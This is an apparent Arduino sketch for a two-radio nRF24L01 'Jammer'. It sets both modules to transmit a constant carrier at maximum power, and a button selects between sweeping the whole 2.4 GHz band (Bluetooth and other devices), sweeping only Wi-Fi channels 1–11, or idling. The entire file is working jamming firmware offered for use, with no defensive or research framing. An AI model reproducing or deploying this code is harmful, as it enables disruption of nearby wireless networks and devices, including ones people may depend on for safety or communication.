#include <SPI.h>           // Include_SPI_library_for_serial_communication_with_RF24_modules --------------------------------------!>
#include "RF24.h"          // Include_RF24_library_for_nRF24L01_radio_module_control --------------------------------------!>
#include <ezButton.h>      // Include_ezButton_library_for_button_debouncing_functionality --------------------------------------!>
#include <string>          // Include_string_library_for_string_manipulation --------------------------------------!>

// Define_two_RF24_radio_objects_with_different_CE_and_CSN_pins --------------------------------------!>
// First_radio:_CE_pin_2,_CSN_pin_4_(using_hardware_SPI_SS_pin) --------------------------------------!>
RF24 radio(2, 4);          // CE,_CSN_for_1st_Radio_module --------------------------------------!>
// Second_radio:_CE_pin_0,_CSN_pin_5_(using_hardware_SPI_SS_pin) --------------------------------------!>
RF24 radio2(0, 5);         // CE,_CSN_for_2nd_Radio_module --------------------------------------!>

byte i = 45;               // Variable_to_store_constant_carrier_value_(used_in_startConstCarrier) --------------------------------------!>

// Initialize_button_on_pin_3_with_pull-up_resistor_configuration --------------------------------------!>
ezButton button(3);        // Button_object_connected_to_digital_pin_3 --------------------------------------!>

// Array_of_Wi-Fi_channel_frequencies_in_MHz_(2.4_GHz_band_channels_1-11) --------------------------------------!>
const int wifiFrequencies[] = {
  2412,  // Channel_1_frequency_in_MHz --------------------------------------!>
  2417,  // Channel_2_frequency_in_MHz --------------------------------------!>
  2422,  // Channel_3_frequency_in_MHz --------------------------------------!>
  2427,  // Channel_4_frequency_in_MHz --------------------------------------!>
  2432,  // Channel_5_frequency_in_MHz --------------------------------------!>
  2437,  // Channel_6_frequency_in_MHz --------------------------------------!>
  2442,  // Channel_7_frequency_in_MHz --------------------------------------!>
  2447,  // Channel_8_frequency_in_MHz --------------------------------------!>
  2452,  // Channel_9_frequency_in_MHz --------------------------------------!>
  2457,  // Channel_10_frequency_in_MHz --------------------------------------!>
  2462   // Channel_11_frequency_in_MHz --------------------------------------!>
};

/**
 * Function_to_display_a_message_on_the_serial_monitor --------------------------------------!>
 * @param_line_-_Pointer_to_character_array_containing_the_message_to_display --------------------------------------!>
 */
void displayMessage(const char* line)
{
  Serial.println(line);    // Print_the_message_to_serial_monitor_with_newline --------------------------------------!>
}

/**
 * Function_to_display_startup_advertising_message --------------------------------------!>
 * Provides_user_instructions_about_button_functionality --------------------------------------!>
 */
void addvertising() {
  displayMessage("Jammer got up. Click the button and discover all modes!");  // Display_startup_message --------------------------------------!>
}

/**
 * Setup_function_runs_once_when_the_device_starts --------------------------------------!>
 * Initializes_hardware_components_and_radio_modules --------------------------------------!>
 */
void setup() {
  Serial.begin(9600);      // Initialize_serial_communication_at_9600_baud_rate --------------------------------------!>
  button.setDebounceTime(100);  // Set_button_debounce_time_to_100ms_to_prevent_false_triggers --------------------------------------!>
  pinMode(3, INPUT_PULLUP);     // Configure_pin_3_as_input_with_internal_pull-up_resistor_enabled --------------------------------------!>
  pinMode(LED_BUILTIN, OUTPUT); // Configure_built-in_LED_pin_as_output --------------------------------------!>
  digitalWrite(LED_BUILTIN, HIGH); // Turn_off_built-in_LED_(active_LOW_on_many_boards) --------------------------------------!>
 
  delay(900);              // Delay_900ms_to_allow_hardware_to_stabilize --------------------------------------!>
  
  // Initialize_first_radio_module --------------------------------------!>
  if (radio.begin()) {     // Attempt_to_initialize_first_nRF24L01_module --------------------------------------!>
    delay(200);            // Short_delay_after_initialization --------------------------------------!>
    radio.setAutoAck(false);    // Disable_automatic_acknowledgment_for_continuous_transmission --------------------------------------!>
    radio.stopListening();      // Set_radio_as_transmitter_(not_receiver) --------------------------------------!>
    radio.setRetries(0, 0);     // Disable_retransmission_attempts --------------------------------------!>
    radio.setPayloadSize(5);    // Set_payload_size_to_5_bytes --------------------------------------!>
    radio.setAddressWidth(3);   // Set_address_width_to_3_bytes --------------------------------------!>
    radio.setPALevel(RF24_PA_MAX);  // Set_power_amplifier_level_to_maximum_for_strongest_signal --------------------------------------!>
    radio.setDataRate(RF24_2MBPS);  // Set_data_rate_to_2_Mbps_for_faster_transmission --------------------------------------!>
    radio.setCRCLength(RF24_CRC_DISABLED);  // Disable_CRC_checking_for_continuous_carrier_operation --------------------------------------!>
    radio.printPrettyDetails();     // Print_radio_configuration_details_to_serial_monitor --------------------------------------!>
    radio.startConstCarrier(RF24_PA_MAX, i);  // Start_constant_carrier_wave_transmission_at_max_power --------------------------------------!>

    digitalWrite(LED_BUILTIN, LOW); // Turn_built-in_LED_on --------------------------------------!>
    delay(500);                     // Keep_LED_on_for_500ms --------------------------------------!>
    digitalWrite(LED_BUILTIN, HIGH); // Turn_built-in_LED_off --------------------------------------!>
    delay(500);                     // Keep_LED_off_for_500ms --------------------------------------!>

    Serial.println("1st Radio started!");  // Confirm_first_radio_initialization --------------------------------------!>
    
  } else {
    Serial.println("1st Radio Could not be started");  // Error_message_if_first_radio_fails --------------------------------------!>
    displayMessage("Jammer Error!");                   // Display_error_to_user --------------------------------------!>
  }
  
  delay(900);              // Delay_900ms_before_initializing_second_radio --------------------------------------!>
  
  // Initialize_second_radio_module_(similar_configuration_to_first_radio) --------------------------------------!>
  if (radio2.begin()) {    // Attempt_to_initialize_second_nRF24L01_module --------------------------------------!>
    delay(200);            // Short_delay_after_initialization --------------------------------------!>
    radio2.setAutoAck(false);   // Disable_automatic_acknowledgment --------------------------------------!>
    radio2.stopListening();     // Set_radio_as_transmitter --------------------------------------!>
    radio2.setRetries(0, 0);    // Disable_retransmission_attempts --------------------------------------!>
    radio2.setPayloadSize(5);   // Set_payload_size_to_5_bytes --------------------------------------!>
    radio2.setAddressWidth(3);  // Set_address_width_to_3_bytes --------------------------------------!>
    radio2.setPALevel(RF24_PA_MAX); // Set_power_amplifier_level_to_maximum --------------------------------------!>
    radio2.setDataRate(RF24_2MBPS); // Set_data_rate_to_2_Mbps --------------------------------------!>
    radio2.setCRCLength(RF24_CRC_DISABLED); // Disable_CRC_checking --------------------------------------!>
    radio2.printPrettyDetails();    // Print_radio_configuration_details --------------------------------------!>
    radio2.startConstCarrier(RF24_PA_MAX, i); // Start_constant_carrier_wave_transmission --------------------------------------!>

    digitalWrite(LED_BUILTIN, LOW); // Turn_built-in_LED_on --------------------------------------!>
    delay(500);                     // Keep_LED_on_for_500ms --------------------------------------!>
    digitalWrite(LED_BUILTIN, HIGH); // Turn_built-in_LED_off --------------------------------------!>
    delay(500);                     // Keep_LED_off_for_500ms --------------------------------------!>

    Serial.println("2nd Radio started!");  // Confirm_second_radio_initialization --------------------------------------!>
  } else {
    Serial.println("2nd Radio Could not be started"); // Error_message_if_second_radio_fails --------------------------------------!>
    displayMessage("Jammer Error!");                  // Display_error_to_user --------------------------------------!>
  }
  
  addvertising();          // Display_advertising_message_with_usage_instructions --------------------------------------!>
}

/**
 * Function_to_perform_full_spectrum_attack_on_all_2.4_GHz_channels --------------------------------------!>
 * Cycles_through_channels_0-79_covering_the_entire_2.4_GHz_band --------------------------------------!>
 */
void fullAttack() {
  for (size_t i = 0; i < 80; i++) {  // Loop_through_all_80_channels_(2.4_GHz_spectrum) --------------------------------------!>
    radio.setChannel(i);             // Set_first_radio_to_current_channel --------------------------------------!>
    i++;                             // Increment_index_for_second_radio --------------------------------------!>
    radio2.setChannel(i);            // Set_second_radio_to_next_channel --------------------------------------!>
    // Note:_Two_radios_can_transmit_on_adjacent_channels_simultaneously --------------------------------------!>
  }
}

/**
 * Function_to_perform_Wi-Fi_specific_attack --------------------------------------!>
 * Targets_only_the_standard_Wi-Fi_channels_(1-11_in_2.4_GHz_band) --------------------------------------!>
 */
void wifiAttack() {
  // Calculate_number_of_Wi-Fi_channels_in_the_array --------------------------------------!>
  for (int i = 0; i < sizeof(wifiFrequencies) / sizeof(wifiFrequencies[0]); i++) {
    // Convert_frequency_in_MHz_to_nRF24L01_channel_number_(channel_=_frequency_-_2400) --------------------------------------!>
    radio.setChannel(wifiFrequencies[i] - 2400);  // Set_radio_to_Wi-Fi_channel --------------------------------------!>
  }
}

// Array_of_available_attack_modes_for_user_selection --------------------------------------!>
const char* modes[] = {
  "BLE & All 2.4 GHz",   // Mode_0:_Full_spectrum_attack_(all_2.4_GHz_devices_including_BLE) --------------------------------------!>
  "Just Wi-Fi",          // Mode_1:_Attack_only_Wi-Fi_channels --------------------------------------!>
  "Waiting Idly :("      // Mode_2:_Idle_mode_(no_jamming) --------------------------------------!>
};

uint8_t attack_type = 2;  // Variable_to_store_current_attack_mode_(default:_idle_mode) --------------------------------------!>

/**
 * Main_program_loop_-_runs_repeatedly --------------------------------------!>
 * Handles_button_input_and_executes_selected_attack_mode --------------------------------------!>
 */
void loop() {
  button.loop();           // Update_button_state_(required_for_ezButton_library) --------------------------------------!>
  
  // Check_if_button_was_pressed --------------------------------------!>
  if (button.isPressed()) {
    attack_type = (attack_type + 1) % 3;  // Cycle_through_attack_modes_(0,_1,_2) --------------------------------------!>
    displayMessage("Button Pressed!");    // Notify_user_of_button_press --------------------------------------!>
    // Display_the_newly_selected_mode --------------------------------------!>
    displayMessage((String(modes[attack_type])+" Mode").c_str());
    
    // Visual_feedback:_blink_LED_number_of_times_equal_to_selected_mode_index --------------------------------------!>
    for(int h=0; h <= attack_type; h++)  // Loop_based_on_mode_number --------------------------------------!>
    {
      digitalWrite(LED_BUILTIN, LOW);    // Turn_LED_on --------------------------------------!>
      delay(500);                        // Wait_500ms --------------------------------------!>
      digitalWrite(LED_BUILTIN, HIGH);   // Turn_LED_off --------------------------------------!>
      delay(500);                        // Wait_500ms --------------------------------------!>
    }
  }
  
  // Execute_the_currently_selected_attack_mode --------------------------------------!>
  switch (attack_type) {
    case 0:
      fullAttack();    // Execute_full_spectrum_attack_(all_2.4_GHz_channels) --------------------------------------!>
      break;
    case 1:
      wifiAttack();    // Execute_Wi-Fi_only_attack --------------------------------------!>
      break;
    case 2:
      // Idle_mode_-_do_nothing,_radio_remains_in_constant_carrier_mode_from_setup --------------------------------------!>
      break;
  }
}